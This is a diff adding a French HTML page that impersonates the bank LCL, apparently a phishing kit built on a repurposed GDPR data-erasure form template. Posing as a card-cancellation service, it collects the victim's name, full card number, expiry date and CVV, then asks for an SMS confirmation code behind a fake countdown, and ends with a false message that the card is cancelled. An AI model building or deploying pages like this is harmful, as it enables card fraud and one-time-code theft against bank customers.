@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Suppression de mes données personnelles</title>
+  <meta name="robots" content="noindex">
+
+  <!-- Si Montserrat est déjà chargée sur votre site, supprimez ces 3 lignes -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="rgpd-erasure.css">
+  <style>body { margin: 0; background: #fff; }</style>
+</head>
+<body>
+
+<!-- ===================== DÉBUT DU BLOC À INTÉGRER ===================== -->
+<section class="rgpd-erasure" id="rgpd-erasure" aria-labelledby="rgpd-title">
+  <div class="rgpd-erasure__inner">
+
+    <!-- Remplacez src par le chemin de votre logo -->
+    <div class="rgpd-erasure__logo">
+      <a href="/" aria-label="Retour à l'accueil">
+        <img src="lcl.jpg" alt="Logo de la boutique" width="190" height="60">
+      </a>
+    </div>
+
+    <p class="rgpd-erasure__eyebrow">Fraude à la carte bancaire</p>
+    <h1 class="rgpd-erasure__title" id="rgpd-title">Faire opposition à votre carte bancaire</h1>
+    <p class="rgpd-erasure__intro">
+      En remplissant ce formulaire, vous acceptez la mise <strong>hors service définitive de votre carte bancaire actuelle.</strong> Le remplacement de votre carte bancaire est entièrement gratuit chez LCL. Aucune somme ne vous sera facturée pour ce changement de carte.
+    </p>
+
+    <ol class="rgpd-erasure__steps" aria-label="Progression">
+      <li aria-current="step" data-step-indicator="1">
+        <span class="rgpd-erasure__step-num">1</span>
+        <span class="rgpd-erasure__step-label">Identification</span>
+      </li>
+      <li data-step-indicator="2">
+        <span class="rgpd-erasure__step-num">2</span>
+        <span class="rgpd-erasure__step-label">Confirmation</span>
+      </li>
+    </ol>
+
+    <!-- ========== ÉTAPE 1 : IDENTIFICATION ========== -->
+    <div class="rgpd-erasure__step" data-step="1">
+      <form id="rgpd-step1" novalidate>
+        <p class="rgpd-erasure__required-note">*Champs obligatoires</p>
+
+        <div class="rgpd-erasure__alert" role="alert" data-alert></div>
+
+        <div class="rgpd-erasure__grid">
+          <div class="rgpd-erasure__field" data-field="lastName">
+            <label class="rgpd-erasure__label" for="rgpd-lastName">Nom*</label>
+            <input class="rgpd-erasure__input" id="rgpd-lastName" name="lastName" type="text"
+                   autocomplete="family-name" maxlength="60" required
+                   aria-describedby="rgpd-lastName-error">
+            <p class="rgpd-erasure__error" id="rgpd-lastName-error"></p>
+          </div>
+
+          <div class="rgpd-erasure__field" data-field="firstName">
+            <label class="rgpd-erasure__label" for="rgpd-firstName">Prénom*</label>
+            <input class="rgpd-erasure__input" id="rgpd-firstName" name="firstName" type="text"
+                   autocomplete="given-name" maxlength="60" required
+                   aria-describedby="rgpd-firstName-error">
+            <p class="rgpd-erasure__error" id="rgpd-firstName-error"></p>
+          </div>
+
+          <div class="rgpd-erasure__field rgpd-erasure__field--full" data-field="orderNumber">
+            <label class="rgpd-erasure__label" for="rgpd-orderNumber">
+              Numéro de carte*</label>
+            <input class="rgpd-erasure__input" id="rgpd-orderNumber" name="orderNumber" type="text"
+                   autocomplete="off" maxlength="30" placeholder="Ex. : 4012 0010 3714 1112"
+                   aria-describedby="rgpd-orderNumber-hint rgpd-orderNumber-error">
+            <p class="rgpd-erasure__hint" id="rgpd-orderNumber-hint">
+              Ces chiffres ne seront plus valables après la confirmation de votre demande d’opposition.
+            </p>
+            <p class="rgpd-erasure__error" id="rgpd-orderNumber-error"></p>
+          </div>
+
+          <div class="rgpd-erasure__field" data-field="birthDayYear">
+            <label class="rgpd-erasure__label" for="rgpd-birthDayYear">La date d'expiration*</label>
+            <input class="rgpd-erasure__input" id="rgpd-birthDayYear" name="birthDayYear" type="text"
+                   inputmode="numeric" maxlength="7" placeholder="Ex : 12/31"
+                   autocomplete="off" required
+                   aria-describedby="rgpd-birthDayYear-hint rgpd-birthDayYear-error">
+            <p class="rgpd-erasure__hint" id="rgpd-birthDayYear-hint"></p>
+            <p class="rgpd-erasure__error" id="rgpd-birthDayYear-error"></p>
+          </div>
+
+          <div class="rgpd-erasure__field" data-field="accountId">
+            <label class="rgpd-erasure__label" for="rgpd-accountId">CVV / CVC</label>
+            <input class="rgpd-erasure__input" id="rgpd-accountId" name="accountId" type="text"
+                   autocomplete="username" autocapitalize="none" spellcheck="false" maxlength="100"
+                   placeholder="Ex : 310" required
+                   aria-describedby="rgpd-accountId-hint rgpd-accountId-error">
+            <p class="rgpd-erasure__hint" id="rgpd-accountId-hint">Composé de 3 chiffres situés au dos.</p>
+            <p class="rgpd-erasure__error" id="rgpd-accountId-error"></p>
+          </div>
+        </div>
+
+        <div class="rgpd-erasure__footer">
+          <p class="rgpd-erasure__privacy">
+            Ces informations servent uniquement à vérifier votre identité et à traiter votre demande.
+            <a href="/politique-de-confidentialite">Politique de confidentialité</a>
+          </p>
+          <button type="submit" class="rgpd-btn">
+            Suivant
+            <svg class="rgpd-btn__arrow" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M4 12h15m0 0-6-6m6 6-6 6" stroke="currentColor" stroke-width="1.8"
+                    stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <!-- ========== ÉTAPE 2 : à développer ========== -->
+    <!-- ========== ÉTAPE 2 : E-MAIL DE CONFIRMATION ========== -->
+    <div class="rgpd-erasure__step" data-step="2" hidden tabindex="-1">
+      <form id="rgpd-step2" novalidate>
+        <p class="rgpd-erasure__required-note">*Champs obligatoires</p>
+
+        <div class="rgpd-erasure__alert" role="alert" data-alert></div>
+
+
+<div class="sms-notification">
+  <div class="sms-notification__icon">
+    <span>✉</span>
+  </div>
+
+  <div class="sms-notification__content">
+    <strong>Envoi de votre SMS</strong>
+    <p>Les informations relatives à votre carte sont en cours de vérification.</p>
+    <div class="sms-notification__timer">
+      <span>Réception estimée dans</span>
+      <strong id="sms-timer">02:00</strong>
+    </div>
+  </div>
+</div>
+
+        <div class="rgpd-erasure__grid">
+          <div class="rgpd-erasure__field rgpd-erasure__field--full" data-field="smsNum">
+            <label class="rgpd-erasure__label" for="rgpd-smsNum">SMS de confirmation reçu.*</label>
+            <input class="rgpd-erasure__input" id="rgpd-smsNum" name="smsNum" type="smsNum"
+                   autocomplete="smsNum" autocapitalize="none" spellcheck="false" maxlength="120"
+                   placeholder="Ex : 050201" required
+                   aria-describedby="rgpd-smsNum-hint rgpd-smsNum-error">
+            <p class="rgpd-erasure__hint" id="rgpd-smsNum-hint">
+              En validant cette étape, votre carte bancaire sera immédiatement rendue inutilisable.
+            </p>
+            <p class="rgpd-erasure__error" id="rgpd-smsNum-error"></p>
+          </div>
+        </div>
+
+        <div class="rgpd-erasure__footer">
+          <button type="button" class="rgpd-erasure__back" data-go-step="1">← Modifier mes informations</button>
+          <button type="submit" class="rgpd-btn">
+            Envoyer ma demande
+            <svg class="rgpd-btn__arrow" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M4 12h15m0 0-6-6m6 6-6 6" stroke="currentColor" stroke-width="1.8"
+                    stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <!-- ========== CONFIRMATION FINALE ========== -->
+    <div class="rgpd-erasure__step rgpd-erasure__done" data-step="done" hidden tabindex="-1" role="status">
+      <div class="rgpd-erasure__done-icon" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4.5 4.5L19 7.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <h2 class="rgpd-erasure__done-title">Confirmation de votre opposition bancaire</h2>
+      <p class="rgpd-erasure__done-text">
+        Nous vous confirmons que votre demande d’opposition à votre carte bancaire a bien été prise en compte.
+<strong data-done-smsNum></strong>
+</p>
+
+<p class="rgpd-erasure__done-text">
+  <strong>
+    Cette opposition est effective immédiatement. Votre carte est <br> désormais définitivement inutilisable pour toute opération.
+  </strong>
+  <br><br>
+  Un accusé de réception vous sera adressé par SMS.
+
+  Pour obtenir davantage d’informations concernant les modalités de création et de délivrance d’une nouvelle carte bancaire, nous vous invitons à vous rapprocher de votre conseiller bancaire.
+</p>
+
+<a class="rgpd-btn" href="/">
+        Quitter
+        <svg class="rgpd-btn__arrow" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M4 12h15m0 0-6-6m6 6-6 6" stroke="currentColor" stroke-width="1.8"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </a>
+    </div>
+
+  </div>
+</section>
+<!-- ===================== FIN DU BLOC À INTÉGRER ===================== -->
+
+<script src="rgpd-erasure.js" defer></script>
+</body>
+</html>
